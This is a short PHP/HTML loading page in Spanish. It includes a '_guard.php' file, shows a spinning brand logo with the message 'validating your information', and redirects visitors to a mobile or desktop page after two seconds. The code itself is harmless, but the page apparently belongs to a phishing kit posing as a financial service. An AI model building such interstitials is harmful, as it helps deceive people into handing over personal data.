<?php require_once __DIR__ . '/_guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <style>
        body {
            background-color: #FFFFFF;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        .loader {
            width: 150px;
            height: 150px;
            background: url('img/logo-avanz-mini.png') no-repeat center;
            background-size: contain;
            animation: spin 2s linear;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    
    <script>
        setTimeout(function() {
            var esMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            if (esMovil) {
                window.location.href = "indexmovil.html"; // Versión móvil
            } else {
                window.location.href = "pcindex.html"; // Versión PC
            }
        }, 2000); // Redirige después de 2 segundos
    </script>
</head>
<body>
    <div class="loader"></div>
    <p style="font-family: sans-serif; font-size: 15px;">Estamos validando su información.</p>
</body>
</html>
